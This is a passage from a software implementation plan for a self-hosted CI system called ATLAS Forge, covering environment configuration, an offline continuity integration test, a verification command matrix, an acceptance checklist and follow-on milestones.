ATLAS_FORGE_PIPELINES_ROOT=/opt/atlas/atlasenterprisesuite/.atlas/forge/pipelines
ATLAS_FORGE_API_URL=http://127.0.0.1:8788
ATLAS_FORGE_BIND=127.0.0.1
ATLAS_FORGE_PORT=8788
ATLAS_FORGE_RUNNER_ID=runner-primary
```

The operations doc explicitly instructs the operator to create `ATLAS_FORGE_CONTROL_TOKEN` and `ATLAS_FORGE_RUNNER_TOKEN` in `/etc/atlas-forge/forge.env` with at least 32 random bytes and `chmod 600`; no secret example value is committed.

- [ ] **Step 4: Ignore local runtime state**

`.gitignore` must include:

```gitignore
node_modules/
dist/
.atlas-forge/
*.log
```

Before replacing any existing ignore file discovered during implementation, merge these entries rather than deleting existing rules.

- [ ] **Step 5: Shell-validate and commit**

```bash
bash -n scripts/forge/bootstrap-local-repository.sh
bash -n scripts/forge/sync-git-mirror.sh
git add scripts/forge infra/forge docs/operations/atlas-forge-bootstrap.md .gitignore
git commit -m "ops: bootstrap sovereign ATLAS Forge services"
```

---

### Task 9: Sovereign continuity E2E and final bootstrap gate

**Files:**
- Create: `tests/integration/forge-sovereign-ci.test.ts`
- Modify: `package.json`
- Modify: `docs/operations/atlas-forge-bootstrap.md`

**Interfaces:**
- Verifies the Milestone 1 promise: local source + local API + local runner + local artifact vault still complete a run when the configured GitHub mirror is unavailable.

- [ ] **Step 1: Write the full sovereign integration test**

The test must perform all of these actions in one temporary directory:

1. create a source Git repo containing a minimal npm package and `dist/index.html` generation script;
2. create/push to a local bare repo `repos/atlas.git`;
3. add a `github` remote pointing to a guaranteed-missing local path and assert `syncMirror(...).state === 'unavailable'`;
4. start Forge API on an ephemeral port;
5. queue exact source SHA with a test pipeline containing only allowed `npm` commands;
6. execute a runner `once` cycle;
7. fetch the run and assert `status === 'passed'`;
8. assert every recorded step is `passed`;
9. assert the artifact record exists and `verifyArtifact(record) === true`;
10. assert the GitHub mirror remains `unavailable` and did not change the run outcome;
11. assert an audit event exists for run creation and run completion.

The central assertions are:

```ts
expect(mirror.state).toBe('unavailable');
expect(run.status).toBe('passed');
expect(run.artifact?.verified).toBe(true);
expect(await artifactStore.verifyArtifact(run.artifact!)).toBe(true);
```

- [ ] **Step 2: Verify the sovereign E2E passes without network**

```bash
npm test -- tests/integration/forge-sovereign-ci.test.ts
```

Expected: PASS with the `github` remote deliberately unavailable.

- [ ] **Step 3: Add a focused Forge verification script**

Add root script:

```json
{
  "test:forge": "vitest run --config apps/web/vite.config.ts tests/unit/forge-core.test.ts tests/unit/forge-runner.test.ts tests/unit/forge-artifacts.test.ts tests/integration/forge-git.test.ts tests/integration/forge-api.test.ts tests/integration/forge-runner-api.test.ts tests/integration/forge-sovereign-ci.test.ts"
}
```

- [ ] **Step 4: Run the complete bootstrap verification matrix**

Run fresh, from the final implementation SHA:

```bash
npm ci --no-audit --no-fund
npm run typecheck
npm run test:forge
npm run test:unit
npm run test:integration
npm audit --audit-level=high
npm run build
npm run forge:build
```

Expected: every command exits `0`. If the existing application suites fail for a pre-existing unrelated reason, record the exact failing test and do not mark Forge bootstrap complete until the release branch is green again.

- [ ] **Step 5: Smoke the emergency local runner against the real ATLAS checkout**

```bash
ATLAS_FORGE_HOME="$(mktemp -d)" npm run forge:ci:local
```

Expected: the local runner records the exact current Git SHA, executes the canonical `atlas-ci` pipeline, and writes evidence under the temporary Forge home. Do not claim success if this command has not actually run on a complete checkout.

- [ ] **Step 6: Verify repository integrity and commit**

```bash
git fsck --full
git status --short
git add tests/integration/forge-sovereign-ci.test.ts package.json package-lock.json docs/operations/atlas-forge-bootstrap.md
git commit -m "test: prove ATLAS Forge sovereign CI continuity"
```

Expected: clean worktree after commit and a green Forge verification matrix.

---

## Bootstrap Acceptance Gate

Milestone 1 is accepted only with evidence for all items below:

- [ ] Local bare Git repository resolves the same exact SHA as the source branch.
- [ ] `git fsck --full` succeeds on the ATLAS-controlled source copy.
- [ ] `npm run forge:ci:local` executes without GitHub Actions.
- [ ] Forge API `/healthz` is `ready` on the ATLAS-controlled host.
- [ ] Runner claims a queued exact-SHA job and executes it in a disposable workspace.
- [ ] Ambient control/runner tokens are absent from job environments and logs.
- [ ] Unit, integration, dependency audit, and production build steps produce terminal evidence.
- [ ] Artifact Vault publishes and re-verifies SHA-256 content-addressed evidence.
- [ ] Deliberately unavailable `github` mirror reports `unavailable` while sovereign CI still passes.
- [ ] Audit evidence ties run creation/completion to correlation IDs.
- [ ] systemd API and runner services restart cleanly after host process restart.
- [ ] At least one independent source copy exists in addition to the primary Forge bare repository before Forge is called resilient; until then the readiness state must say backup verification is pending.
- [ ] No merge to `main`, production deployment, or claim of full Forge completion occurs from this milestone alone.

## Follow-on Plans After This Milestone

Once this bootstrap acceptance gate is green, write separate implementation plans in this order:

1. `ATLAS Forge Reviews + Consensus Gate` — internal review object, changed-file review, approvals, merge eligibility, 3-of-3 consensus.
2. `ATLAS Forge Multi-Runner Scheduler + Secret References` — capability labels, leases, retries, short-lived runner credentials, encrypted secret backend adapter.
3. `ATLAS Forge Release Engine` — release candidates, approval, deployment adapters, `/healthz` verification, rollback metadata.
4. `ATLAS Forge Web UI` — `/forge/*` operational screens backed only by real Forge API state.
5. `ATLAS Forge Replication + Disaster Recovery` — second independent repository/metadata copy, automated integrity checks, tested restore procedure.

The bootstrap runner is intentionally first because it removes the current GitHub Actions runner dependency before the broader Forge product surface is built.
